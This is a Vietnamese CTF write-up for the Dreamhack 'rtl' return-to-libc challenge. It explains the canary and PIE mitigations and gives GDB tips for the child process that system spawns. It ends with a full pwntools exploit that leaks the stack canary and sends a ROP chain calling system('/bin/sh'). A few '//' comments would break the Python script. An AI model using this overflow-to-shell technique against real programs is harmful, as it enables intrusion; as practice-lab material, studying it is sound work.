# Link Challenge Dreamhack

[Return to Library](https://dreamhack.io/wargame/challenges/353)

# Phân tích code 

<img width="831" height="640" alt="image" src="https://github.com/user-attachments/assets/3a89e63a-8d3b-407d-b837-4f11ccdb791a" />
<img width="766" height="206" alt="image" src="https://github.com/user-attachments/assets/a23e72e2-449d-4b60-99d2-4210b94a700a" />

Chương trình đưa sẵn system vào bảng PLT tức ta có thể gọi `exe.sym['system']` để lấy địa chỉ hàm system. Đồng thời chương trình cũng tạo sẵn
biến chứa chuỗi `/bin/sh` chỉ cần tìm địa chỉ rồi đưa vào làm tham số thứ nhất khi gọi system.

Mitigation:

Đồng thời *PIE* cũng tắt nên không cần leak 
binary address. Tuy nhiên vẫn có *Canary* nên cần leak *Canary* trước.

# *Lưu ý khi DEBUG*

<img width="1401" height="965" alt="Screenshot 2026-10-28 181947" src="https://github.com/user-attachments/assets/a7ca135e-e134-4108-980c-6173834b1a5c" />

<br><br>
- Khi DEBUG thì chạy đến hàm system bị ngắt luồng thực thi. Vì khi gọi system thì tiến trình Inferior 1 (cha) đã tạo 1 tiến trình Inferior (con).
Tiến trình con này sau khi in ra màn hình `'system@plt'` thì kết thúc.

Để quay lại tiến trình cha thì dùng lệnh `attach pid` của tiến trình Inferior 1:

<br>

<img width="902" height="195" alt="image" src="https://github.com/user-attachments/assets/f0d2e151-455b-4c6b-8acc-f2e1c26bea10" />

Lúc DEBUG động bằng gdb.attach thì cần dùng chuỗi lệnh để đợi tiến trình Inferior 2 kết thúc mới bắt đầu gọi gọi gdb.attach. Mục đích để dữ liệu và câu lệnh khai thác của chúng ta không bị tiến trình con chặn mất.

    def GDB():
        if not args.REMOTE:
            gdb.attach(p, gdbscript='''
            b*main+140
            c
            ''')
            sleep(1)
    
    p.recvuntil(b'Canary')   
    GDB()

` p.recvuntil(b'Canary')` là để đợi tín hiệu cho biết chương trình đã quay lại và sẵn sàng đẻ attach.

## Gadget

<img width="1075" height="122" alt="image" src="https://github.com/user-attachments/assets/1f02c232-40a7-4b2f-9824-d7b2a4e6afe7" />

## Script Python

    #!/usr/bin/env python3
    from pwn import *
    
    context.binary=exe=ELF('./rtl',checksec=False)
    p=process('./rtl')
    
    def GDB():
        if not args.REMOTE:
            gdb.attach(p, gdbscript='''
            b*main+140
    
            c
            ''')
            sleep(1)
    
    p.recvuntil(b'Canary')
    GDB()
    
    p.sendafter(b'Buf: ',b'A'*57)    //leak canary
    p.recvuntil(b'A'*57)
    canary=u64(b'\x00'+p.recv(7))
    print(hex(canary))
    
    pop_rdi=0x0000000000400853
    pop_rsi_r15=0x0000000000400851
    rw_section=0x601078+300*8
    binsh=0x400874
    
    payload=b'A'*56
    payload+=p64(canary)
    payload+=p64(rw_section)
    payload+=p64(pop_rdi)
    payload+=p64(binsh)
    payload+=p64(pop_rsi_r15)
    payload+=p64(0)
    payload+=p64(0)
    payload+=p64(exe.sym['system'])
    
    p.sendafter(b'Buf: ',payload)   //Overwrite
    
    p.interactive()





